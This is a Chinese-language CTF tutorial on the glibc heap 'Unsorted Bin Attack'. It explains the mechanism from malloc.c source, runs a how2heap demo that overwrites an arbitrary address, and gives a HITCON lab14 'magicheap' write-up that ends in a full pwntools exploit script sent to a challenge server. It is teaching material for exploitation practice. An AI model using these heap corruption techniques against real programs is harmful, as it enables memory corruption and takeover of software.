# Unsorted Bin Attack

## 概述 

Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。

Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。

Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。

## Unsorted Bin 回顾 

在介绍 Unsorted Bin 攻击前，可以先回顾一下 Unsorted Bin 的基本来源以及基本使用情况。

### 基本来源 

1. 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。
3. 当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。

### 基本使用情况 

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

## 原理 

在 [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) 中的 `_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck->fd` 的位置写入本 Unsorted Bin 的位置。

```c
          /* remove from unsorted list */
          if (__glibc_unlikely (bck->fd != victim))
            malloc_printerr ("malloc(): corrupted unsorted chunks 3");
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

换而言之，如果我们控制了 bk 的值，我们就能将 `unsorted_chunks (av)` 写到任意地址。

这里我以 shellphish 的 how2heap 仓库中的 [unsorted_bin_attack.c](https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) 为例进行介绍，这里我做一些简单的修改，如下

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
  fprintf(stderr, "This file demonstrates unsorted bin attack by write a large "
                  "unsigned long value into stack\n");
  fprintf(
      stderr,
      "In practice, unsorted bin attack is generally prepared for further "
      "attacks, such as rewriting the "
      "global variable global_max_fast in libc for further fastbin attack\n\n");

  unsigned long target_var = 0;
  fprintf(stderr,
          "Let's first look at the target we want to rewrite on stack:\n");
  fprintf(stderr, "%p: %ld\n\n", &target_var, target_var);

  unsigned long *p = malloc(400);
  fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",
          p);
  fprintf(stderr, "And allocate another normal chunk in order to avoid "
                  "consolidating the top chunk with"
                  "the first one during the free()\n\n");
  malloc(500);

  free(p);
  fprintf(stderr, "We free the first chunk now and it will be inserted in the "
                  "unsorted bin with its bk pointer "
                  "point to %p\n",
          (void *)p[1]);

  /*------------VULNERABILITY-----------*/

  p[1] = (unsigned long)(&target_var - 2);
  fprintf(stderr, "Now emulating a vulnerability that can overwrite the "
                  "victim->bk pointer\n");
  fprintf(stderr, "And we write it with the target address-16 (in 32-bits "
                  "machine, it should be target address-8):%p\n\n",
          (void *)p[1]);

  //------------------------------------

  malloc(400);
  fprintf(stderr, "Let's malloc again to get the chunk we just free. During "
                  "this time, target should has already been "
                  "rewrite:\n");
  fprintf(stderr, "%p: %p\n", &target_var, (void *)target_var);
}
```

程序执行后的效果为

```
➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
➜  unsorted_bin_attack git:(master) ✗ ./unsorted_bin_attack
This file demonstrates unsorted bin attack by write a large unsigned long value into stack
In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the target we want to rewrite on stack:
0x7ffe0d232518: 0

Now, we allocate first normal chunk on the heap at: 0x1fce010
And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()

We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。

![img](img/unsorted_bin_attack_order.png)

**初始状态时**

unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。

**执行 free(p)**

由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。

**修改 p[1]**

经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。

**申请 400 大小的 chunk**

此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。

``` c
        while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) {
            bck = victim->bk;
            if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) ||
                __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0))
                malloc_printerr(check_action, "malloc(): memory corruption",
                                chunk2mem(victim), av);
            size = chunksize(victim);

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */
            /* 显然，bck被修改，并不符合这里的要求*/
            if (in_smallbin_range(nb) && bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) {
                ....
            }

            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd                 = unsorted_chunks(av);
```

- victim = unsorted_chunks(av)->bk=p
- bck = victim->bk=p->bk = target addr-16
- unsorted_chunks(av)->bk = bck=target addr-16
- bck->fd = *(target addr -16+16) = unsorted_chunks(av);

> 上面四步就是遍历寻找 unsorted bin 中是否有符合申请大小的 chunk ，上面这个是 bin 中 chunk 大小大于申请 size + MINSIZE 的情况。
>
> 前面两个是变量的定义：victim 当前堆、bck 后一块堆；
>
> 后面是遍历合适 chunk 之后 unlink 取出操作：
>
> * unsorted_chunks(av) 前一块堆的 bk 指针指向后一块堆块 bck ；
> * 后一块堆块 bck fd 指针指向前一块堆块 unsorted_chunks(av) ；
>
> **四步中 victim fd 一直没有被使用过；bk 指针影响 bck、bck->fd 的值。如果我们能够控制 victim 的 bk 指针就能将 unsorted_chunks(av) 这个地址值写到任意地址（原因看面 unlink 的第四步）**，举个例子：
>
> unsorted_chunks(av) 的地址值为：0x61616161 ，想将其写入到 target_addr 。控制 victim->bk 为：target_addr - 16 ，当进行 unlink 时会执行：bck->fd = *(target_addr -16+16) = unsorted_chunks(av); ，成功将 0x61616161 写入到 target_addr

**可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。**然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。

即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。

```
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
```

这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。**而且，需要注意的是，**

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

- **我们通过修改循环的次数来使得程序可以执行多次循环。（修改任意地址内容，内容不可控）**
- **我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。**

## HITCON Training lab14 magic heap

[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14)

这里我们修改一下源程序中的 l33t 函数，以便于可以正常运行。（buu 上的题目替换为了 /bin/sh ）

```c
void l33t() { system("cat ./flag"); }
```

### 基本信息 

```shell
➜  hitcontraining_lab14 git:(master) file magicheap
magicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
➜  hitcontraining_lab14 git:(master) checksec magicheap
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出，该程序是一个动态链接的 64 程序，主要开启了 NX 保护与 Canary 保护。

### 基本功能 

程序大概就是自己写的堆管理器，主要有以下功能

1. 创建堆。根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。
2. 编辑堆。根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，这里其实就出现了任意长度堆溢出的漏洞。
3. 删除堆。根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。

同时，我们看到，当我们控制 v3 为 4869，同时控制 magic 大于 4869，就可以得到 flag 了。

### 利用 

很显然， 我们直接利用 unsorted bin attack 即可。控制 bk 指针向目标地址写入一个大数字。

1. 释放一个堆块到 unsorted bin 中。
2. 利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-16。
3. 触发漏洞即可（申请）。

### EXP

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./magicheap")
p = remote("node3.buuoj.cn",25014)
elf = ELF("./magicheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,content):
	p.sendlineafter(':','1')
	p.sendlineafter(':',str(size))
	p.sendafter(':',content)
def edit(id,size,content):
	p.sendlineafter(':','2')
	p.sendlineafter(':',str(id))
	p.sendlineafter(':',str(size))
	p.sendafter(':',content)
def free(id):
	p.sendlineafter(':','3')
	p.sendlineafter(':',str(id))

create(0x10,'a')
create(0x80,'a'*0x10)
create(0x10,'a'*0x10)

free(1)

payload = 'a'*0x10
payload += p64(0) + p64(0x91)
payload += p64(0xdeadbeef) + p64(0x6020A0-0x10)#p64(0x06020C0-0x10)
edit(0,len(payload),payload)

create(0x80,"skye")

p.sendlineafter(':',str(0x1305))

# gdb.attach(p)
p.interactive()
```



 